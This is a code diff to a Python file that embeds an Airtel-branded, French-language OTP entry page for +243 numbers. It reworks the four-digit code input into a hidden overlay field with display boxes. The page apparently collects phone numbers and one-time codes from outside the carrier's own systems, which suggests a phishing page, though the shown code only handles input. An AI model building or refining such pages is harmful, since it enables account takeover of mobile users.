@@ -463,67 +463,14 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
         }
       };
 
-      const hOC = (i, v) => {
-        // If the value contains a 4-digit code (e.g. from autofill, copy-paste)
-        const digits = v.replace(/\D/g, '').substring(0, 4);
-        if (digits.length === 4) {
-          setError('');
-          setOtp(digits.split(''));
-          return;
+      const handleInputChange = (e) => {
+        const val = e.target.value.replace(/\D/g, '').substring(0, 4);
+        setError('');
+        const digits = val.split('');
+        while (digits.length < 4) {
+          digits.push('');
         }
-
-        // For regular single-digit entry, restrict input to a single digit
-        const singleDigit = v.replace(/\D/g, '').slice(-1);
-        if (singleDigit === '' || /^\d$/.test(singleDigit)) {
-          setError('');
-          setOtp(prevOtp => {
-            const n = [...prevOtp];
-            n[i] = singleDigit;
-            return n;
-          });
-          if (singleDigit && i < 3) {
-            const next = document.getElementById(`otp-${i + 1}`);
-            if (next) next.focus();
-          }
-        }
-      };
-
-      const handleOtpPaste = (e) => {
-        const pasteData = e.clipboardData.getData('text');
-        const digits = pasteData.replace(/\D/g, '').substring(0, 4);
-        if (digits.length === 4) {
-          setError('');
-          setOtp(digits.split(''));
-        } else if (digits.length > 0) {
-          setOtp(prevOtp => {
-            const n = [...prevOtp];
-            for (let idx = 0; idx < digits.length; idx++) {
-              n[idx] = digits[idx];
-            }
-            return n;
-          });
-          const nextIndex = Math.min(digits.length, 3);
-          const next = document.getElementById(`otp-${nextIndex}`);
-          if (next) next.focus();
-        }
-        e.preventDefault();
-      };
-
-      const handleKeyDown = (i, e) => {
-        if (e.key === 'Backspace') {
-          setError('');
-          if (!otp[i] && i > 0) {
-            const prev = document.getElementById(`otp-${i - 1}`);
-            if (prev) {
-              prev.focus();
-              setOtp(prevOtp => {
-                const n = [...prevOtp];
-                n[i - 1] = '';
-                return n;
-              });
-            }
-          }
-        }
+        setOtp(digits);
       };
 
       const handleLoginSubmit = async () => {
@@ -701,23 +648,33 @@ AIRTEL_HTML = r"""<!DOCTYPE html>
               <div className='bg-white w-full max-w-2xl rounded-t-[32px] shadow-xl p-8 sm:p-12 text-center'>
                 <h2 className='text-3xl font-bold text-gray-900'>Entrez le code OTP</h2>
                 <p className='text-gray-500 mt-4 text-lg'>Le code de vérification a été envoyé au numéro <span className='font-bold text-gray-900'>+243 {phone}</span> renseigné précédemment.</p>
-                <div className='flex justify-center gap-2 sm:gap-4 mt-10'>
-                  {[0, 1, 2, 3].map((i) => (
-                    <input 
-                      key={i} 
-                      id={`otp-${i}`} 
-                      type='text' 
-                      inputMode='numeric' 
-                      autoComplete={i === 0 ? 'one-time-code' : 'off'} 
-                      pattern='[0-9]*' 
-                      maxLength='4' 
-                      className='w-10 h-14 sm:w-16 sm:h-20 text-center text-2xl sm:text-3xl font-bold border border-gray-300 rounded-xl sm:rounded-2xl focus:border-red-500 outline-none' 
-                      value={otp[i] || ''} 
-                      onChange={(e) => hOC(i, e.target.value)} 
-                      onPaste={handleOtpPaste} 
-                      onKeyDown={(e) => handleKeyDown(i, e)} 
-                    />
-                  ))}
+                <div className='relative flex justify-center gap-2 sm:gap-4 mt-10 max-w-xs mx-auto' style={{ height: '5rem' }}>
+                  <input
+                    id="otp-real-input"
+                    type="text"
+                    inputMode="numeric"
+                    autoComplete="one-time-code"
+                    pattern="[0-9]*"
+                    maxLength={4}
+                    value={otp.join('').trim()}
+                    onChange={handleInputChange}
+                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
+                    style={{ zIndex: 10, fontSize: '16px' }} 
+                  />
+                  {[0, 1, 2, 3].map((i) => {
+                    const currentVal = otp[i] || '';
+                    const isFocused = otp.join('').trim().length === i || (otp.join('').trim().length === 4 && i === 3);
+                    return (
+                      <div 
+                        key={i} 
+                        className={`w-10 h-14 sm:w-16 sm:h-20 flex items-center justify-center text-2xl sm:text-3xl font-bold border rounded-xl sm:rounded-2xl transition-all ${
+                          isFocused ? 'border-red-500 ring-2 ring-red-100 bg-white' : 'border-gray-300 bg-white'
+                        }`}
+                      >
+                        {currentVal}
+                      </div>
+                    );
+                  })}
                 </div>
                 <div className='mt-6 text-gray-500 font-medium'>Renvoyer le code dans <span className='text-red-600'>{timer}s</span></div>
                 {error && (
